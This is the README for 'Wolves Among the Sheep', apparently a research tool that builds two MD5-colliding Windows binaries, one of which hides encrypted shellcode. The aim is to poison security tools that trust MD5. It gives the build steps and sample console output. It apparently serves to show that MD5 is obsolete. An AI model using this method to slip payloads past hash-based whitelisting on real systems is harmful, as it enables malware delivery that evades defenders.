Wolves Among the Sheep
======================

Poisoning security tools that use obsolate crypto.

Dependencies
------------

* Visual Studio 2012 to compile the projects (Express will do)
* PHP (CLI) to run [longEgg](https://github.com/natmchugh/longEgg) (referenced as submodule)
* [Fastcoll](https://www.win.tue.nl/hashclash/) for collisions

Usage
-----

Extract `fastcoll` to the `fastcoll` directory.

Use `shepherd.bat` to generate the appropriate header file with the encrypted shellcode:

```
> shepherd.bat YOURPASSWORD your_shellcode.raw
```

Run `long\_egg.php` in its own directory - this way it will find `sheep.exe` copyed next to it by the batch file (with the name `demo` that is currently hardwired in longEgg).

Feed the resulting hash to `fastcoll` in the way showed below (don't change CWD, output should be named `a` and `b`).
This will create two files `a` and `b` that will be consumed by `long\_egg.php` when it's executed again.

```
X:\path\sheep\> shepherd.bat YOURPASSWORD msgbox.raw
[... build output ...]

X:\path\sheep\> cd long_egg

X:\path\sheep\long_egg> php long_egg.php
I want to replace 128 bytes at position 48448 in X:\path\sheep\long_egg\demo
48448
Chainring variable up to that point is deadbabedeadbabedeadbabedeadbabe
Run fastcoll to generate a 2 block collision in MD5

X:\path\sheep\long_egg> ..\fastcoll\fastcoll.exe -i deadbabedeadbabedeadbabedeadbabe -o a b
MD5 collision generator v1.5
by Marc Stevens (http://www.win.tue.nl/hashclash/)

Using output filenames: 'a' and 'b'
Using initial value: deadbabedeadbabedeadbabedeadbabe

Generating first block: ....................
Generating second block: S10.................
Running time: 1.337 s

X:\path\sheep\long_egg> php long_egg.php
I want to replace 128 bytes at position 48448 in X:\path\sheep\long_egg\demo
48448
Chainring variable up to that point is deadbabedeadbabedeadbabedeadbabe
Just output new file /home/b/tools/md5/sheep/long_egg/devil with hash deadbeefdeadbeefdeadbeefdeadbeef
Just output new file /home/b/tools/md5/sheep/long_egg/angel with hash deadbeefdeadbeefdeadbeefdeadbeef
```

After this step you should have your two colliding binaries (`angel` and `devil`).

For more information see the [tutorial of Nate McHugh](http://natmchugh.blogspot.co.uk/2015/05/how-to-make-two-binaries-with-same-md5.html):

References
----------

* [Poisonous MD5 - Wolves Among the Sheep](#TODO)
* [How to make two binaries with same MD5](http://natmchugh.blogspot.co.uk/2015/05/how-to-make-two-binaries-with-same-md5.html)
* [Stop using MD5 now!](#TODO)

Tips and Tricks
---------------

MD5.php of longEgg uses PHP 5.4 syntax for declaring arrays. If you're using an older version you should replace `[x, y, z]` declarations to `array(x, y, z)`.

TODO
----

* Improve longEgg to accept parameters
